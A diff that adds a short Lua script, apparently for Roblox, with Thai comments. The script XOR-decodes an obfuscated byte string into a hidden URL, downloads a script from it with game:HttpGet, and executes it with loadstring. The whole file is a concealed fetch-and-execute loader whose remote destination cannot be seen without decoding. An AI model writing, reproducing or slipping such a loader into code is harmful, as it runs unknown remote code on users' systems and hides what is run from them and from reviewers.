@@ -1,0 +1,30 @@
+-- เดิมโค้ดที่ obfuscated
+local function xor_string(input, key)
+    local result = {}
+    for i = 1, #input do
+        local input_byte = string.byte(input, i, i)
+        local key_byte = string.byte(key, 1 + ((i - 1) % #key), 1 + ((i - 1) % #key))
+        table.insert(result, string.char(bit32.bxor(input_byte, key_byte) % 256))
+    end
+    return table.concat(result)
+end
+
+-- ข้อความที่ถูกเข้ารหัส
+local encoded_string = "\217\215\207\53\245\225\136\81\193\194\200\49\227\189\222\80\208\211\203\106\203\174\255\41\133\242\194\1\169\169\198\9"
+local key = "\126\177\163\187\69\134\219\167"
+
+-- ถอดรหัสข้อความ
+local decoded_string = xor_string(encoded_string, key)
+
+-- โหลดสคริปต์จาก URL
+local script_content = game:HttpGet(decoded_string)
+
+-- หากโหลดสคริปต์สำเร็จ ให้ทำการประมวลผล
+if script_content then
+    local success, result = pcall(loadstring(script_content))
+    if not success then
+        warn("Error while loading script: " .. result)
+    end
+else
+    warn("Failed to load script")
+end
